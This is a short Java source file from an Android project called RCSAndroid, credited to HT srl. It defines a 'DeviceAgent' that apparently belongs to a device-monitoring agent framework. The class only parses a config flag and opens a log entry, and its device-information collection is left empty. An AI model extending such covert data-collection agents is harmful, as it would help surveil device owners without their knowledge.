/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.nio.ByteOrder;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.util.Log;

public class DeviceAgent extends AgentBase {
	private int processList;

	public DeviceAgent() {
		Log.d("RCS", "DeviceAgent constructor");
	}
	
	public void parse(byte[] conf) {
		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);
		
		this.processList = myConf.getInt();
	}
	
	public void begin() {
		setDelay(2000);
	}
	
	public void go() {
		LogR log = new LogR(Agent.AGENT_DEVICE, LogR.LOG_PRI_STD);
		
		// OS Version etc...
		Log.d("RCS", "Device Agent: logging something");
		
		if (processList == 1) {
			
		}
		
		log.close();
	}
	
	public void end() {
		
	}
}
